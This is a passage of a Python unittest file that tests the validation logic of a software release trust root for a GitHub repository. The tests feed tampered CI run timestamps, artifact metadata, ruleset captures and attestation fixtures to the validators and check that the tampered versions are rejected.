#!/usr/bin/env python3
"""Offline adversarial tests for the FR-0014 epoch-15 trust root."""

from __future__ import annotations

import base64
import copy
import gc
import hashlib
import importlib.util
import json
import os
import signal
import subprocess
import sys
import tempfile
import time
import unittest
import warnings
from collections import Counter
from contextlib import contextmanager
from datetime import datetime, timezone
from pathlib import Path
from types import ModuleType
from typing import Any, Iterator
from unittest import mock


ROOT = Path(__file__).resolve().parents[2]
COMMIT = "a" * 40
TREE = "b" * 40
RUN_ID = 42_424_242
RUN_NUMBER = 707
ATTEMPT = 2


def load_module(relative: str, name: str) -> ModuleType:
    specification = importlib.util.spec_from_file_location(name, ROOT / relative)
    if specification is None or specification.loader is None:
        raise RuntimeError(relative)
    module = importlib.util.module_from_spec(specification)
    specification.loader.exec_module(module)
    return module


PROTOCOL = load_module(
    "tools/release/framework_recovery_fr_0014.py",
    "_haldir_fr0014_test_protocol",
)
RESULT = load_module(
    "tools/release/framework_recovery_fr_0014_result.py",
    "_haldir_fr0014_test_result",
)
BRIDGE = load_module(
    "tools/release/verify-framework-recovery-fr-0014.py",
    "_haldir_fr0014_test_bridge",
)
CAPTURE = load_module(
    "tools/release/framework_recovery_fr_0014_capture.py",
    "_haldir_fr0014_test_capture",
)
PINS = load_module("tools/verify-ci-pins.py", "_haldir_fr0014_test_pins")


def utc(hour: int, minute: int, second: int = 0) -> str:
    return f"2026-07-29T{hour:02d}:{minute:02d}:{second:02d}Z"


def utc_fraction(
    hour: int,
    minute: int,
    second: int,
    microsecond: int,
) -> str:
    return f"2026-07-29T{hour:02d}:{minute:02d}:{second:02d}.{microsecond:06d}Z"


def job_at(
    name: str,
    database_id: int,
    started_at: str,
    completed_at: str,
) -> dict:
    return {
        "completedAt": completed_at,
        "conclusion": "success",
        "databaseId": database_id,
        "name": name,
        "startedAt": started_at,
        "status": "completed",
        "steps": [
            {
                "completedAt": completed_at,
                "conclusion": "success",
                "name": "complete",
                "number": 1,
                "startedAt": started_at,
                "status": "completed",
            }
        ],
        "url": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/job/{database_id}"
        ),
    }


def job(name: str, database_id: int, start: int, end: int) -> dict:
    return job_at(name, database_id, utc(12, start), utc(12, end))


def run_documents(workflow: str = "ci") -> tuple[dict, dict]:
    if workflow == "ci":
        names = sorted(PROTOCOL.EPOCH15_CI_JOB_NAMES)
        producer = "supply-chain"
        attester = "attest-ci-audit-result"
    else:
        names = sorted(PROTOCOL.EPOCH15_FORMAL_JOB_NAMES)
        producer = "tlc-model-check"
        attester = "attest-formal-audit-result"
    jobs = []
    for index, name in enumerate(names, start=1):
        start, end = (1, 4) if name == producer else (1, 3)
        if name == attester:
            start, end = 6, 8
        jobs.append(job(name, 50_000 + index, start, end))
    common = {
        "attempt": ATTEMPT,
        "conclusion": "success",
        "createdAt": utc(10, 0),
        "databaseId": RUN_ID,
        "event": "push",
        "headBranch": "main",
        "headSha": COMMIT,
        "jobs": jobs,
        "number": RUN_NUMBER,
        "status": "completed",
        "updatedAt": utc(12, 10),
        "workflowDatabaseId": PROTOCOL.WORKFLOW_DATABASE_IDS[workflow],
        "workflowName": workflow,
    }
    ordinary = {
        **common,
        "url": f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}",
    }
    attempt = {
        **common,
        "createdAt": utc(12, 0),
        "startedAt": utc(12, 0),
        "url": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/attempts/{ATTEMPT}"
        ),
    }
    return ordinary, attempt


def live_run_documents(
    attempt_number: int,
    *,
    workflow: str = "ci",
) -> tuple[dict, dict]:
    if workflow == "ci":
        names = sorted(PROTOCOL.EPOCH15_CI_JOB_NAMES)
        producer = "supply-chain"
        attester = "attest-ci-audit-result"
    else:
        names = sorted(PROTOCOL.EPOCH15_FORMAL_JOB_NAMES)
        producer = "tlc-model-check"
        attester = "attest-formal-audit-result"
    if attempt_number == 2:
        attempt_started = utc(17, 57, 8)
        attempt_created = utc(17, 57, 10)
        attempt_updated = utc(17, 58, 57)
        carried_started = utc(17, 55, 27)
        carried_completed = utc(17, 56, 30)
        producer_started = utc(17, 57, 19)
        producer_completed = utc(17, 58, 40)
        attester_started = utc(17, 58, 51)
        attester_completed = utc(17, 58, 56)
    elif attempt_number == 3:
        attempt_started = utc(18, 3, 46)
        attempt_created = utc(18, 3, 52)
        attempt_updated = utc(18, 5, 32)
        carried_started = utc(18, 3, 54)
        carried_completed = utc(18, 4, 45)
        producer_started = utc(18, 3, 54)
        producer_completed = utc(18, 5, 15)
        attester_started = utc(18, 5, 25)
        attester_completed = utc(18, 5, 31)
    else:
        raise ValueError("live fixture only models attempts 2 and 3")
    jobs = []
    for index, name in enumerate(names, start=1):
        started_at = carried_started
        completed_at = carried_completed
        if name == producer:
            started_at = producer_started
            completed_at = producer_completed
        elif name == attester:
            started_at = attester_started
            completed_at = attester_completed
        jobs.append(job_at(name, 70_000 + index, started_at, completed_at))
    common = {
        "attempt": attempt_number,
        "conclusion": "success",
        "createdAt": utc(17, 55, 25),
        "databaseId": RUN_ID,
        "event": "push",
        "headBranch": "main",
        "headSha": COMMIT,
        "jobs": jobs,
        "number": RUN_NUMBER,
        "status": "completed",
        "updatedAt": attempt_updated,
        "workflowDatabaseId": PROTOCOL.WORKFLOW_DATABASE_IDS[workflow],
        "workflowName": workflow,
    }
    ordinary = {
        **common,
        "url": f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}",
    }
    attempt = {
        **common,
        "createdAt": attempt_created,
        "startedAt": attempt_started,
        "url": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/attempts/{attempt_number}"
        ),
    }
    return ordinary, attempt


def set_job_times(
    ordinary: dict,
    attempt: dict,
    name: str,
    *,
    started_at: str,
    completed_at: str,
) -> None:
    for document in (ordinary, attempt):
        selected = next(item for item in document["jobs"] if item["name"] == name)
        selected["startedAt"] = started_at
        selected["completedAt"] = completed_at
        selected["steps"][0]["startedAt"] = started_at
        selected["steps"][0]["completedAt"] = completed_at


def repository_identity() -> dict:
    return {
        "id": BRIDGE.REPOSITORY_ID,
        "name": BRIDGE.REPOSITORY_NAME,
        "full_name": BRIDGE.REPOSITORY_FULL_NAME,
        "default_branch": BRIDGE.REPOSITORY_DEFAULT_BRANCH,
        "fork": False,
        "owner": {
            "id": BRIDGE.MAIN_RULESET_OWNER_ID,
            "login": BRIDGE.REPOSITORY_OWNER_LOGIN,
            "type": "User",
        },
        "has_parent": False,
        "has_source": False,
    }


def ruleset_documents() -> tuple[list, dict, list, list, dict]:
    ruleset_id = 8_181
    version_id = 9_191
    node_id = "RRS_fixture"
    api_url = f"https://api.github.com/repos/sepahead/haldir/rulesets/{ruleset_id}"
    summary = {
        "id": ruleset_id,
        "name": BRIDGE.MAIN_RULESET_NAME,
        "target": "branch",
        "enforcement": "active",
        "source_type": "Repository",
        "source": "sepahead/haldir",
        "node_id": node_id,
        "_links": {
            "self": {"href": api_url},
            "html": {"href": f"https://github.com/sepahead/haldir/rules/{ruleset_id}"},
        },
        "created_at": "2026-07-29T20:59:51.674+02:00",
        "updated_at": "2026-07-29T20:59:51.694+02:00",
    }
    detail = {
        **summary,
        "bypass_actors": [
            {
                "actor_id": BRIDGE.MAIN_RULESET_OWNER_ID,
                "actor_type": "User",
                "bypass_mode": "always",
            }
        ],
        "conditions": {
            "ref_name": {
                "exclude": [],
                "include": ["refs/heads/main"],
            }
        },
        "rules": [{"type": "update"}],
        "current_user_can_bypass": "always",
    }
    effective = [
        {
            "type": "update",
            "ruleset_id": ruleset_id,
            "ruleset_source_type": "Repository",
            "ruleset_source": "sepahead/haldir",
        }
    ]
    history = [
        {
            "version_id": version_id,
            "updated_at": "2026-07-29T20:59:51.757+02:00",
            "actor": {
                "id": BRIDGE.MAIN_RULESET_OWNER_ID,
                "type": "User",
            },
        }
    ]
    version = {
        **history[0],
        "state": {
            "id": ruleset_id,
            "name": BRIDGE.MAIN_RULESET_NAME,
            "target": "branch",
            "source_type": "Repository",
            "source": "sepahead/haldir",
            "enforcement": "active",
            "conditions": copy.deepcopy(detail["conditions"]),
            "rules": [{"type": "update"}],
            "updated_at": None,
            "bypass_actors": copy.deepcopy(detail["bypass_actors"]),
            "current_user_can_bypass": "always",
        },
    }
    return [summary], detail, effective, history, version


def branch_protection_record(qualification_commit: str = COMMIT) -> dict:
    (
        ruleset_list,
        ruleset_by_id,
        effective_rules,
        ruleset_history,
        ruleset_version,
    ) = ruleset_documents()
    reference = {
        "ref": "refs/heads/main",
        "node_id": "MDM6UmVmMTI5MjgwMjU5MjpyZWZzL2hlYWRzL21haW4=",
        "url": "https://api.github.com/repos/sepahead/haldir/git/refs/heads/main",
        "object": {
            "sha": qualification_commit,
            "type": "commit",
            "url": (
                "https://api.github.com/repos/sepahead/haldir/git/commits/"
                f"{qualification_commit}"
            ),
        },
    }
    contexts = sorted(BRIDGE.REQUIRED_PRE_ACCEPT_CHECKS)
    base = "https://api.github.com/repos/sepahead/haldir/branches/main/protection"
    protection = {
        "url": base,
        "required_status_checks": {
            "url": f"{base}/required_status_checks",
            "strict": True,
            "contexts": contexts,
            "contexts_url": f"{base}/required_status_checks/contexts",
            "checks": [
                {
                    "app_id": BRIDGE.GITHUB_ACTIONS_APP_ID,
                    "context": context,
                }
                for context in contexts
            ],
        },
        "enforce_admins": {
            "url": f"{base}/enforce_admins",
            "enabled": True,
        },
        "required_linear_history": {"enabled": True},
        "required_signatures": {
            "url": f"{base}/required_signatures",
            "enabled": True,
        },
        "allow_force_pushes": {"enabled": False},
        "allow_deletions": {"enabled": False},
        "block_creations": {"enabled": False},
        "required_conversation_resolution": {"enabled": False},
        "lock_branch": {"enabled": False},
        "allow_fork_syncing": {"enabled": False},
    }
    return {
        "schema_version": "1.0.0",
        "protocol": "HALDIR_FR_0014_BRANCH_PROTECTION_CAPTURE_V1",
        "repository": repository_identity(),
        "branch": "main",
        "observed_commit": qualification_commit,
        "ref_before": reference,
        "ref_after": copy.deepcopy(reference),
        "protection": protection,
        "ruleset_list": ruleset_list,
        "ruleset_by_id": ruleset_by_id,
        "effective_rules": effective_rules,
        "ruleset_history": ruleset_history,
        "ruleset_version": ruleset_version,
        "capture": {
            "commit_before_command": (
                "gh api --method GET repos/sepahead/haldir/git/ref/heads/main"
            ),
            "commit_after_command": (
                "gh api --method GET repos/sepahead/haldir/git/ref/heads/main"
            ),
            "protection_command": (
                "gh api --method GET repos/sepahead/haldir/branches/main/protection"
            ),
            "repository_command": ("gh api --method GET repos/sepahead/haldir"),
            "ruleset_list_command": (
                "gh api --method GET repos/sepahead/haldir/rulesets"
            ),
            "ruleset_get_command": (
                "gh api --method GET repos/sepahead/haldir/rulesets/8181"
            ),
            "ruleset_history_command": (
                "gh api --method GET repos/sepahead/haldir/rulesets/8181/history"
            ),
            "ruleset_version_command": (
                "gh api --method GET repos/sepahead/haldir/rulesets/8181/history/9191"
            ),
            "effective_rules_command": (
                "gh api --method GET repos/sepahead/haldir/rules/branches/main"
            ),
            "captured_at_utc": utc(12, 0),
            "transport": "GITHUB_API_OVER_TLS",
            "result": "PASS",
        },
        "authority": {
            "cryptographic_proof": False,
            "durable_external_state_proof": False,
            "release_authority": False,
            "transport_observation": "GITHUB_API_OVER_TLS",
        },
    }


def file_record(path: str, seed: str) -> dict:
    payload = seed.encode()
    framed = b"blob " + str(len(payload)).encode() + b"\0" + payload
    return {
        "path": path,
        "git_mode": "100644",
        "git_object_type": "blob",
        "git_object_id": hashlib.sha1(framed, usedforsecurity=False).hexdigest(),
        "sha256": hashlib.sha256(payload).hexdigest(),
        "bytes": len(payload),
    }


def result_payload(workflow: str = "ci", attempt: int = ATTEMPT) -> tuple[bytes, list]:
    contract = PROTOCOL.RESULT_CONTRACT[workflow]
    materials = [
        file_record(path, f"material-{index}")
        for index, path in enumerate(contract["material_paths"])
    ]
    value = {
        "schema_version": "1.0.0",
        "protocol": PROTOCOL.RESULT_PROTOCOL,
        "repository": {
            "name": PROTOCOL.REPOSITORY,
            "database_id": PROTOCOL.REPOSITORY_ID,
            "owner_database_id": PROTOCOL.REPOSITORY_OWNER_ID,
        },
        "subject": {
            "commit": COMMIT,
            "tree": TREE,
            "ref": "refs/heads/main",
            "event": "push",
        },
        "execution": {
            "workflow": workflow,
            "workflow_ref": (
                f"sepahead/haldir/{contract['workflow_path']}@refs/heads/main"
            ),
            "job": contract["job"],
            "run_id": RUN_ID,
            "run_attempt": attempt,
            "run_number": RUN_NUMBER,
            "command": contract["command"],
            "result": "PASS",
        },
        "materials": materials,
        "authority": {
            "provenance_only": True,
            "release_authority": False,
            "deployment_authority": False,
            "publication_authority": False,
            "tag_authority": False,
        },
    }
    return PROTOCOL.canonical_json_bytes(value, pretty=True), materials


def artifact(payload: bytes, workflow: str = "ci", attempt: int = ATTEMPT) -> dict:
    artifact_id = 9_001
    return {
        "archive_download_url": (
            "https://api.github.com/repos/sepahead/haldir/actions/artifacts/"
            f"{artifact_id}/zip"
        ),
        "created_at": utc(12, 2),
        "digest": "sha256:" + hashlib.sha256(payload).hexdigest(),
        "expired": False,
        "expires_at": "2026-10-27T12:02:00Z",
        "id": artifact_id,
        "name": f"epoch-15-{workflow}-result-attempt-{attempt}.json",
        "node_id": "MDg6QXJ0aWZhY3Q5MDAx",
        "size_in_bytes": len(payload),
        "updated_at": utc(12, 3),
        "url": (
            "https://api.github.com/repos/sepahead/haldir/actions/artifacts/"
            f"{artifact_id}"
        ),
        "workflow_run": {
            "head_branch": "main",
            "head_repository_id": PROTOCOL.REPOSITORY_ID,
            "head_sha": COMMIT,
            "id": RUN_ID,
            "repository_id": PROTOCOL.REPOSITORY_ID,
        },
    }


def attestation_fixture(
    payload: bytes,
    workflow: str = "ci",
    attempt: int = ATTEMPT,
) -> tuple[bytes, list]:
    statement = PROTOCOL._expected_attestation_statement(
        workflow=workflow,
        result_digest=hashlib.sha256(payload).hexdigest(),
        subject_commit=COMMIT,
        expected_ref="refs/heads/main",
        run_id=RUN_ID,
        attempt=attempt,
    )
    bundle = {
        "mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json",
        "verificationMaterial": {"tlogEntries": [{"logIndex": "1"}]},
        "dsseEnvelope": {
            "payload": base64.b64encode(
                json.dumps(statement, separators=(",", ":")).encode()
            ).decode(),
            "payloadType": "application/vnd.in-toto+json",
            "signatures": [{"sig": "AA=="}],
        },
    }
    bundle_payload = (
        json.dumps(bundle, separators=(",", ":"), sort_keys=True) + "\n"
    ).encode()
    workflow_path = PROTOCOL.RESULT_CONTRACT[workflow]["workflow_path"]
    identity = f"https://github.com/sepahead/haldir/{workflow_path}@refs/heads/main"
    certificate = {
        "subjectAlternativeName": identity,
        "issuer": "https://token.actions.githubusercontent.com",
        "githubWorkflowTrigger": "push",
        "githubWorkflowSHA": COMMIT,
        "githubWorkflowName": workflow,
        "githubWorkflowRepository": "sepahead/haldir",
        "githubWorkflowRef": "refs/heads/main",
        "buildSignerURI": identity,
        "buildSignerDigest": COMMIT,
        "runnerEnvironment": "github-hosted",
        "sourceRepositoryURI": "https://github.com/sepahead/haldir",
        "sourceRepositoryDigest": COMMIT,
        "sourceRepositoryRef": "refs/heads/main",
        "sourceRepositoryIdentifier": str(PROTOCOL.REPOSITORY_ID),
        "sourceRepositoryOwnerURI": "https://github.com/sepahead",
        "sourceRepositoryOwnerIdentifier": str(PROTOCOL.REPOSITORY_OWNER_ID),
        "buildConfigURI": identity,
        "buildConfigDigest": COMMIT,
        "buildTrigger": "push",
        "runInvocationURI": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/attempts/{attempt}"
        ),
        "sourceRepositoryVisibilityAtSigning": "public",
    }
    receipt = [
        {
            "attestation": {
                "bundle": bundle,
                "bundle_url": "",
                "initiator": "",
            },
            "verificationResult": {
                "mediaType": (
                    "application/vnd.dev.sigstore.verificationresult+json;version=0.1"
                ),
                "statement": statement,
                "signature": {"certificate": certificate},
                "verifiedTimestamps": [
                    {
                        "type": "Tlog",
                        "uri": "https://rekor.sigstore.dev",
                        "timestamp": utc(12, 7),
                    }
                ],
            },
        }
    ]
    return bundle_payload, receipt


@contextmanager
def changed_directory(path: Path) -> Iterator[None]:
    previous = Path.cwd()
    os.chdir(path)
    try:
        yield
    finally:
        os.chdir(previous)


class RunDocumentTests(unittest.TestCase):
    def validate(
        self,
        ordinary: dict,
        attempt: dict,
        *,
        workflow: str = "ci",
    ) -> dict:
        return PROTOCOL.validate_epoch15_run_documents(
            ordinary,
            attempt,
            workflow=workflow,
            subject_commit=COMMIT,
            expected_ref="refs/heads/main",
        )

    def test_attempt_two_is_valid_and_fully_bound(self) -> None:
        ordinary, attempt = run_documents()
        result = self.validate(ordinary, attempt)
        self.assertEqual(result["attempt"], 2)
        self.assertEqual(result["run_id"], RUN_ID)
        self.assertEqual(set(result["jobs"]), PROTOCOL.EPOCH15_CI_JOB_NAMES)

    def test_live_attempt_two_selective_rerun_semantics(self) -> None:
        ordinary, attempt = live_run_documents(2)
        result = self.validate(ordinary, attempt)
        created = datetime.fromisoformat(attempt["createdAt"].replace("Z", "+00:00"))
        started = datetime.fromisoformat(attempt["startedAt"].replace("Z", "+00:00"))
        self.assertEqual((created - started).total_seconds(), 2)
        carried = result["jobs"]["build-test"]
        self.assertLess(carried["started"], started)
        self.assertGreaterEqual(result["jobs"]["supply-chain"]["started"], started)
        self.assertGreaterEqual(
            result["jobs"]["attest-ci-audit-result"]["started"],
            started,
        )

    def test_live_attempt_three_full_rerun_semantics(self) -> None:
        ordinary, attempt = live_run_documents(3)
        result = self.validate(ordinary, attempt)
        created = datetime.fromisoformat(attempt["createdAt"].replace("Z", "+00:00"))
        started = datetime.fromisoformat(attempt["startedAt"].replace("Z", "+00:00"))
        self.assertEqual((created - started).total_seconds(), 6)
        self.assertTrue(
            all(item["started"] >= started for item in result["jobs"].values())
        )

    def test_carried_unrelated_success_is_accepted(self) -> None:
        ordinary, attempt = live_run_documents(2)
        set_job_times(
            ordinary,
            attempt,
            "build-test",
            started_at=utc(17, 55, 25),
            completed_at=utc(17, 56, 0),
        )
        self.validate(ordinary, attempt)

    def test_carried_current_attempt_critical_jobs_are_rejected(self) -> None:
        for name in ("supply-chain", "attest-ci-audit-result"):
            ordinary, attempt = live_run_documents(2)
            set_job_times(
                ordinary,
                attempt,
                name,
                started_at=utc(17, 57, 7),
                completed_at=utc(17, 57, 30),
            )
            with (
                self.subTest(name=name),
                self.assertRaisesRegex(
                    ValueError,
                    "FR0014_EPOCH15_CURRENT_ATTEMPT_JOBS",
                ),
            ):
                self.validate(ordinary, attempt)

    def test_attempt_one_cannot_start_before_original_run(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = 1
        attempt["attempt"] = 1
        attempt["createdAt"] = ordinary["createdAt"]
        attempt["startedAt"] = utc(9, 59, 59)
        attempt["url"] = (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}/attempts/1"
        )
        with self.assertRaisesRegex(ValueError, "EPOCH15_RUN_CHRONOLOGY"):
            self.validate(ordinary, attempt)

    def test_attempt_one_job_cannot_start_before_original_run(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = 1
        attempt["attempt"] = 1
        attempt["createdAt"] = ordinary["createdAt"]
        attempt["startedAt"] = ordinary["createdAt"]
        attempt["url"] = (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}/attempts/1"
        )
        set_job_times(
            ordinary,
            attempt,
            "build-test",
            started_at=utc_fraction(9, 59, 59, 999_999),
            completed_at=utc(10, 1),
        )
        with self.assertRaisesRegex(ValueError, "FR0014_JOB_TIME"):
            self.validate(ordinary, attempt)

    def test_noncritical_job_outer_bounds_are_exact(self) -> None:
        ordinary, attempt = live_run_documents(2)
        set_job_times(
            ordinary,
            attempt,
            "build-test",
            started_at=ordinary["createdAt"],
            completed_at=ordinary["updatedAt"],
        )
        self.validate(ordinary, attempt)
        attacks = (
            (
                "before-original",
                utc_fraction(17, 55, 24, 999_999),
                utc(17, 56),
            ),
            (
                "after-updated",
                utc(17, 55, 25),
                utc_fraction(17, 58, 57, 1),
            ),
        )
        for label, started_at, completed_at in attacks:
            ordinary, attempt = live_run_documents(2)
            set_job_times(
                ordinary,
                attempt,
                "build-test",
                started_at=started_at,
                completed_at=completed_at,
            )
            with (
                self.subTest(label=label),
                self.assertRaisesRegex(ValueError, "FR0014_JOB_TIME"),
            ):
                self.validate(ordinary, attempt)

    def test_critical_job_attempt_bounds_are_exact(self) -> None:
        for name in ("supply-chain", "attest-ci-audit-result"):
            ordinary, attempt = live_run_documents(2)
            set_job_times(
                ordinary,
                attempt,
                name,
                started_at=attempt["startedAt"],
                completed_at=attempt["updatedAt"],
            )
            with self.subTest(name=name, boundary="exact"):
                self.validate(ordinary, attempt)

            ordinary, attempt = live_run_documents(2)
            set_job_times(
                ordinary,
                attempt,
                name,
                started_at=utc_fraction(17, 57, 7, 999_999),
                completed_at=utc(17, 57, 30),
            )
            with (
                self.subTest(name=name, boundary="before-start"),
                self.assertRaisesRegex(
                    ValueError,
                    "FR0014_EPOCH15_CURRENT_ATTEMPT_JOBS",
                ),
            ):
                self.validate(ordinary, attempt)

            ordinary, attempt = live_run_documents(2)
            set_job_times(
                ordinary,
                attempt,
                name,
                started_at=attempt["startedAt"],
                completed_at=utc_fraction(17, 58, 57, 1),
            )
            with (
                self.subTest(name=name, boundary="after-updated"),
                self.assertRaisesRegex(ValueError, "FR0014_JOB_TIME"),
            ):
                self.validate(ordinary, attempt)

    def test_cross_run_job_url_is_rejected(self) -> None:
        ordinary, attempt = run_documents()
        attempt["jobs"][0]["url"] = (
            "https://github.com/sepahead/haldir/actions/runs/999/job/50001"
        )
        ordinary["jobs"] = copy.deepcopy(attempt["jobs"])
        with self.assertRaisesRegex(ValueError, "FR0014_JOB"):
            PROTOCOL.validate_epoch15_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )

    def test_cross_attempt_documents_are_rejected(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = 1
        with self.assertRaisesRegex(ValueError, "EPOCH15_RUN_METADATA"):
            PROTOCOL.validate_epoch15_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )

    def test_ordinary_attempt_job_mismatch_is_rejected(self) -> None:
        ordinary, attempt = live_run_documents(2)
        attempt["jobs"] = copy.deepcopy(attempt["jobs"])
        selected = next(
            item for item in attempt["jobs"] if item["name"] == "build-test"
        )
        selected["completedAt"] = utc(17, 56, 31)
        selected["steps"][0]["completedAt"] = utc(17, 56, 31)
        with self.assertRaisesRegex(ValueError, "EPOCH15_RUN_JOB_MISMATCH"):
            self.validate(ordinary, attempt)

    def test_run_integer_fields_reject_bool_and_float(self) -> None:
        cases = (
            ("run_id", "databaseId", RUN_ID),
            ("attempt", "attempt", ATTEMPT),
            ("run_number", "number", RUN_NUMBER),
            (
                "workflow_id",
                "workflowDatabaseId",
                PROTOCOL.WORKFLOW_DATABASE_IDS["ci"],
            ),
        )
        for label, field, valid in cases:
            for invalid in (True, float(valid)):
                for side in ("ordinary", "attempt"):
                    ordinary, attempt = run_documents()
                    document = ordinary if side == "ordinary" else attempt
                    document[field] = invalid
                    with (
                        self.subTest(label=label, invalid=invalid, side=side),
                        self.assertRaisesRegex(ValueError, "FR0014_INTEGER"),
                    ):
                        self.validate(ordinary, attempt)
        for label, invalid in (
            ("job_id_bool", True),
            ("job_id_float", 50_001.0),
            ("step_number_bool", True),
            ("step_number_float", 1.0),
        ):
            for side in ("ordinary", "attempt"):
                ordinary, attempt = run_documents()
                attempt["jobs"] = copy.deepcopy(attempt["jobs"])
                document = ordinary if side == "ordinary" else attempt
                if label.startswith("job_id"):
                    document["jobs"][0]["databaseId"] = invalid
                else:
                    document["jobs"][0]["steps"][0]["number"] = invalid
                with (
                    self.subTest(label=label, side=side),
                    self.assertRaisesRegex(ValueError, "FR0014_INTEGER"),
                ):
                    self.validate(ordinary, attempt)

    def test_step_one_second_tolerance_is_exact(self) -> None:
        ordinary, attempt = run_documents()
        selected = next(
            item for item in ordinary["jobs"] if item["name"] == "build-test"
        )["steps"][0]
        selected["startedAt"] = utc(12, 0, 59)
        selected["completedAt"] = utc(12, 3, 1)
        self.validate(ordinary, attempt)

        ordinary, attempt = run_documents()
        selected = next(
            item for item in ordinary["jobs"] if item["name"] == "build-test"
        )["steps"][0]
        selected["startedAt"] = utc_fraction(
            12,
            0,
            58,
            999_999,
        )
        with self.assertRaisesRegex(ValueError, "FR0014_STEP_TIME"):
            self.validate(ordinary, attempt)

        ordinary, attempt = run_documents()
        selected = next(
            item for item in ordinary["jobs"] if item["name"] == "build-test"
        )["steps"][0]
        selected["completedAt"] = utc_fraction(
            12,
            3,
            1,
            1,
        )
        with self.assertRaisesRegex(ValueError, "FR0014_STEP_TIME"):
            self.validate(ordinary, attempt)

    def test_attempt_bound_is_fail_closed(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = attempt["attempt"] = 9
        with self.assertRaisesRegex(ValueError, "epoch15.attempt_number"):
            PROTOCOL.validate_epoch15_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )


class ResultAndArtifactTests(unittest.TestCase):
    def validate_result(
        self,
        payload: bytes,
        materials: list,
        *,
        run_id: int = RUN_ID,
        attempt: int = ATTEMPT,
        run_number: int = RUN_NUMBER,
    ) -> dict:
        return PROTOCOL.validate_result_artifact(
            payload,
            workflow="ci",
            subject_commit=COMMIT,
            subject_tree=TREE,
            run_id=run_id,
            attempt=attempt,
            run_number=run_number,
            expected_ref="refs/heads/main",
            expected_materials=materials,
        )

    def validate_artifact(
        self,
        value: dict,
        payload: bytes,
        *,
        run_id: int = RUN_ID,
        attempt: int = ATTEMPT,
        producer_started: datetime | None = None,
        producer_completed: datetime | None = None,
        attestation_started: datetime | None = None,
    ) -> dict:
        return PROTOCOL.validate_artifact_metadata(
            value,
            workflow="ci",
            run_id=run_id,
            attempt=attempt,
            subject_commit=COMMIT,
            result_payload=payload,
            producer_started=producer_started
            or datetime(2026, 7, 29, 12, 1, tzinfo=timezone.utc),
            producer_completed=producer_completed
            or datetime(2026, 7, 29, 12, 4, tzinfo=timezone.utc),
            attestation_started=attestation_started
            or datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
        )

    def test_attempt_two_result_and_artifact(self) -> None:
        payload, materials = result_payload()
        self.validate_result(payload, materials)
        self.validate_artifact(artifact(payload), payload)

    def test_cross_attempt_result_is_rejected(self) -> None:
        payload, materials = result_payload(attempt=1)
        with self.assertRaisesRegex(ValueError, "RESULT_EXECUTION"):
            PROTOCOL.validate_result_artifact(
                payload,
                workflow="ci",
                subject_commit=COMMIT,
                subject_tree=TREE,
                run_id=RUN_ID,
                attempt=2,
                run_number=RUN_NUMBER,
                expected_ref="refs/heads/main",
                expected_materials=materials,
            )

    def test_cross_attempt_artifact_name_is_rejected(self) -> None:
        payload, _materials = result_payload()
        value = artifact(payload, attempt=1)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_IDENTITY"):
            PROTOCOL.validate_artifact_metadata(
                value,
                workflow="ci",
                run_id=RUN_ID,
                attempt=2,
                subject_commit=COMMIT,
                result_payload=payload,
                producer_started=datetime(2026, 7, 29, 12, 1, tzinfo=timezone.utc),
                producer_completed=datetime(2026, 7, 29, 12, 4, tzinfo=timezone.utc),
                attestation_started=datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
            )

    def test_artifact_outside_producer_window_is_rejected(self) -> None:
        payload, _materials = result_payload()
        value = artifact(payload)
        value["updated_at"] = utc(12, 7)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_CHRONOLOGY"):
            PROTOCOL.validate_artifact_metadata(
                value,
                workflow="ci",
                run_id=RUN_ID,
                attempt=ATTEMPT,
                subject_commit=COMMIT,
                result_payload=payload,
                producer_started=datetime(2026, 7, 29, 12, 1, tzinfo=timezone.utc),
                producer_completed=datetime(2026, 7, 29, 12, 4, tzinfo=timezone.utc),
                attestation_started=datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
            )

    def test_result_integer_and_authority_fields_reject_coercion(self) -> None:
        mutations = (
            ("repository_id", ("repository", "database_id"), PROTOCOL.REPOSITORY_ID),
            (
                "owner_id",
                ("repository", "owner_database_id"),
                PROTOCOL.REPOSITORY_OWNER_ID,
            ),
            ("run_id", ("execution", "run_id"), RUN_ID),
            ("attempt", ("execution", "run_attempt"), ATTEMPT),
            ("run_number", ("execution", "run_number"), RUN_NUMBER),
            ("material_bytes", ("materials", 0, "bytes"), 10),
        )
        for label, path, valid in mutations:
            for invalid in (True, float(valid)):
                payload, materials = result_payload()
                value = json.loads(payload)
                target: Any = value
                for component in path[:-1]:
                    target = target[component]
                target[path[-1]] = invalid
                mutated = PROTOCOL.canonical_json_bytes(value, pretty=True)
                with (
                    self.subTest(label=label, invalid=invalid),
                    self.assertRaisesRegex(ValueError, "FR0014_"),
                ):
                    self.validate_result(mutated, materials)
        for field, invalid in (
            ("provenance_only", 1),
            ("release_authority", 0),
            ("deployment_authority", 0.0),
            ("publication_authority", 0),
            ("tag_authority", 0.0),
        ):
            payload, materials = result_payload()
            value = json.loads(payload)
            value["authority"][field] = invalid
            with (
                self.subTest(field=field),
                self.assertRaisesRegex(ValueError, "RESULT_AUTHORITY"),
            ):
                self.validate_result(
                    PROTOCOL.canonical_json_bytes(value, pretty=True),
                    materials,
                )

    def test_result_expected_integer_arguments_reject_coercion(self) -> None:
        payload, materials = result_payload()
        for label, arguments in (
